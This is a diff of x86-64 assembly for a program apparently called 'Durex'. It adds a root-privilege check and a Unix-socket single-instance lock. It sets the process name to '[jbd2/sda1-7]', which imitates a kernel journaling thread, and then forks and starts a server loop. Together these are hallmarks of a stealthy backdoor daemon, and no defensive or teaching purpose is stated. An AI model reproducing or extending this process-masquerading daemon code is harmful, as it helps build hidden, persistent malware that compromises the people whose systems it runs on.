@@ -8,6 +8,11 @@ section .text
 _start:
     push    rbp
     mov     rbp, rsp
+    xor     rax, rax
+    add     eax, 0x66
+    syscall
+    cmp     eax, 0
+    jne     exit
     call    check_instance
     mov     rdi, [rbp + 0x10]
     lea     rsi, [rel pname]
@@ -45,7 +50,7 @@ _start:
     cmp     eax, 0
     jne     fork2
     mov     rax, [rbp + 0x10]
-    mov     BYTE [rax + 0xb], 54
+    mov     BYTE [rax + 0xb], 53
     jmp     connect
 fork2:
     xor     eax, eax
@@ -54,7 +59,7 @@ fork2:
     cmp     eax, 0
     jne     connect
     mov     rax, [rbp + 0x10]
-    mov     BYTE [rax + 0xb], 55
+    mov     BYTE [rax + 0xb], 54
 connect:
     call    loop_server
 
@@ -77,30 +82,64 @@ strcpy:
 end_strcpy:
     ret
 
+;   rsp -> sockfd
+;   rsp + 0x4 -> len
+;   rsp + 0x8 -> sockaddr
+;   rsp + 0xa -> sockaddr.sun_path
 check_instance:
+    push    rbp
+    mov     rbp, rsp
+    sub     rsp, 0x20
     xor     rsi, rsi
+    xor     rdi, rdi
     xor     rdx, rdx
     xor     rax, rax
-    lea     rdi, [rel lock_name]
-    add     esi, 2 | 100o ; O_RDWR | O_CREAT
-    add     edx, 600o
-    add     eax, 0x02 ; open
+    inc     edi ; AF_UNIX
+    mov     WORD [rsp + 0x8], di ; AF_UNIX
+    add     esi, 2 ; SOCK_DGRAM
+    add     eax, 0x29 ; socket
     syscall
-    mov     edx, eax
-    mov     edi, edx
-    xor     esi, esi
-    add     esi, 2 | 4 ; LOCK_EX| LOCK_NB
+    mov     DWORD [rsp], eax
+    lea     rdi, [rsp + 0xa]
+    lea     rsi, [rel lock_name]
+    call    strcpy
+    mov     DWORD [rsp + 0x4], 2 + lock_name.len
+    xor     ecx, ecx
+bindunsock:
+    cmp     ecx, 2
+    je      exit
+    inc     ecx
+    mov     edi, DWORD [rsp]
+    lea     rsi, [rsp + 0x8]
+    mov     edx, DWORD [rsp + 0x4]
     xor     eax, eax
-    add     eax, 0x49 ; flock
+    add     eax, 0x31 ; bind
     syscall
     cmp     eax, 0
-    jne     exit
-    mov     edi, edx
+    je      checkend
+    cmp     eax, -98 ; EADDRINUSE
+    jne     checkend
+    mov     edi, DWORD [rsp]
+    lea     rsi, [rsp + 0x8]
+    xor     edx, edx
     xor     eax, eax
-    add     eax, 0x03 ; close
+    add     edx, 110
+    add     eax, 0x2a ; connect
     syscall
+    cmp     eax, 0
+    je      exit
+    cmp     eax, -111 ; ECONNREFUSED
+    jne     bindunsock
+    lea     rdi, [rel lock_name]
+    xor     eax, eax
+    add     eax, 0x57 ; unlink
+    syscall
+    jmp     bindunsock
+checkend:
+    leave
     ret
 
-    lock_name: db "/tmp/.Durex.lock", 0
-    pname: db "[jbd2/sda1-8]", 0
+    lock_name: db "/var/lock/Durex", 0
+        .len: equ $ - lock_name
+    pname: db "[jbd2/sda1-7]", 0
     dir: db "/", 0
